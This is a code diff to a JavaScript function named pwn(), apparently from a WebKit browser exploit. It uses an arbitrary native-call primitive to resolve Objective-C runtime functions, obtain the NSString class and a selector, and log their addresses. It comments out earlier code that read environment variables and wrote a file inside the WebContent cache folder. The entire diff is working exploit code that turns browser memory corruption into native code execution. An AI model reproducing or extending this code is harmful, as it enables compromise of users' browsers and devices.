@@ -380,24 +380,41 @@ function pwn() {
         return arbCall(writeAddr, fd, buf, size);
     }
     
-    log(`[+] HOME: ${getenv("HOME")}`);
-    log(`[+] PATH: ${getenv("PATH")}`);
-    log(`[+] USER: ${getenv("USER")}`);
+    let objc_getClassAddr = arbCall(dlsymAddr, -2, "objc_getClass");
+    let objc_msgSendAddr = arbCall(dlsymAddr, -2, "objc_msgSend");
+    let sel_registerNameAddr = arbCall(dlsymAddr, -2, "sel_registerName");
     
-    let filePath = getenv("HOME") + "/Library/Caches/com.apple.WebKit.WebContent/file.txt";
-    log(`[+] filePath: ${filePath}`);
+    log(`[+] objc_getClass address: 0x${objc_getClassAddr.toString(16)}`);
+    log(`[+] objc_msgSend address: 0x${objc_msgSendAddr.toString(16)}`);
+    log(`[+] sel_registerName address: 0x${sel_registerNameAddr.toString(16)}`);
     
-    const O_RDWR = 0x0002;
-    const O_CREAT = 0x00000200;
-    const O_TRUNC = 0x00000400;
+    let NSStringClass = arbCall(objc_getClassAddr, "NSString");
+    log(`[+] NSStringClass: 0x${NSStringClass.toString(16)}`);
     
-    let fd = open(filePath, O_RDWR | O_CREAT | O_TRUNC);
-    // check if it failed
-    if (Number(fd) == 0xFFFFFFFFFFFFFFFF) {
-        log("[+] Failed to open file!");
-        return;
-    }
+    let stringWithCStringSel = arbCall(sel_registerNameAddr, "stringWithCString:");
+    log(`[+] stringWithCStringSel: 0x${stringWithCStringSel.toString(16)}`);
     
-    log(`[+] fd: ${fd}`);
-    write(fd, "Hello, World!", 13);
+//    let ret = arbCall(objc_msgSendAddr, NSStringClass, stringWithCStringSel, "Hello, World!");
+//    log(`[+] ret: 0x${ret.toString(16)}`);
+//    
+//    log(`[+] HOME: ${getenv("HOME")}`);
+//    log(`[+] PATH: ${getenv("PATH")}`);
+//    log(`[+] USER: ${getenv("USER")}`);
+//    
+//    let filePath = getenv("HOME") + "/Library/Caches/com.apple.WebKit.WebContent/file.txt";
+//    log(`[+] filePath: ${filePath}`);
+//    
+//    const O_RDWR = 0x0002;
+//    const O_CREAT = 0x00000200;
+//    const O_TRUNC = 0x00000400;
+//    
+//    let fd = open(filePath, O_RDWR | O_CREAT | O_TRUNC);
+//    // check if it failed
+//    if (Number(fd) == 0xFFFFFFFFFFFFFFFF) {
+//        log("[+] Failed to open file!");
+//        return;
+//    }
+//    
+//    log(`[+] fd: ${fd}`);
+//    write(fd, "Hello, World!", 13);
 }
